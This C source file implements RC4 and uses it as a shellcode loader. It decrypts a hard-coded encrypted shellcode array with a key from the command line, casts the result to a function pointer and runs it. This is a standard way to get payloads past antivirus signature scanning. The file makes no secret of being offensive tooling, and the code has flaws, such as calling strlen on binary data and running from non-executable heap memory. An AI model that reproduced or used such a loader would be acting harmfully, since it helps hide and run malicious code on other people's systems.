/*
 *     robin verton, dec 2015
 *         implementation of the RC4 algo
 *         */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

unsigned char encrypted_shellcode[] = "\x41\x68\x3a\xba\xcd\x94\x9f\x4f\xd1\xb4\x30\xa2\xa7\xad\xc9\x88\xe8\xed\xdb\x38\xfe\xe4\x4c\x9c\xfc";

#define N 256   // 2^8

void swap(unsigned char *a, unsigned char *b) {
	    int tmp = *a;
	        *a = *b;
		    *b = tmp;
}

int KSA(char *key, unsigned char *S) {

	    int len = strlen(key);
	        int j = 0;

		    for(int i = 0; i < N; i++)
			            S[i] = i;

		        for(int i = 0; i < N; i++) {
				        j = (j + S[i] + key[i % len]) % N;

					        swap(&S[i], &S[j]);
						    }

			    return 0;
}

int PRGA(unsigned char *S, char *encrypted_shellcode, unsigned char *ciphertext) {

	    int i = 0;
	        int j = 0;

		    for(size_t n = 0, len = strlen(encrypted_shellcode); n < len; n++) {
			            i = (i + 1) % N;
				            j = (j + S[i]) % N;

					            swap(&S[i], &S[j]);
						            int rnd = S[(S[i] + S[j]) % N];

							            ciphertext[n] = rnd ^ encrypted_shellcode[n];

								        }

		        return 0;
}

int RC4(char *key, char *encrypted_shellcode, unsigned char *ciphertext) {

	    unsigned char S[N];
	        KSA(key, S);

		    PRGA(S, encrypted_shellcode, ciphertext);

		        return 0;
}

// copy to s2 without the /x (not necessary for rc4)
void parseShellcode(char *s1, int len, char *s2){

	//printf("%d",strlen(s2));
	//printf("\n%s", s1);
	int i, j = 0;
	for(i=0; i< len; i++){
		if(s1[i] == '\\' || s1[i]=='x')
			continue;
		s2[j] = s1[i];
		j++;
	}
}

int main(int argc, char *argv[]) {

	    if(argc < 2) {
		            printf("Usage: %s <key>", argv[0]);
			            return -1;
				        }
		
		

		unsigned char *ciphertext = malloc(sizeof(int) * strlen(encrypted_shellcode));
		
		//int len = strlen(argv[2]);
		//unsigned char *shellcode = (char*)malloc(sizeof(int) * (strlen(argv[2])));
		//parseShellcode(argv[2], len, shellcode);
		// printf("%s\n",shellcode);
		//printf("%s\n",argv[2]);
		
		

		RC4(argv[1], encrypted_shellcode, ciphertext);

			// for(size_t i = 0, len = strlen(encrypted_shellcode); i < len; i++)
			// 		//printf("\\x%02hhX", ciphertext[i]);
			// 		printf("\\x%02x", ciphertext[i]);
			// 		//printf("%c",ciphertext[i]);
		
		int (*ret)() = (int(*)())ciphertext;
		ret();

		return 0;
}

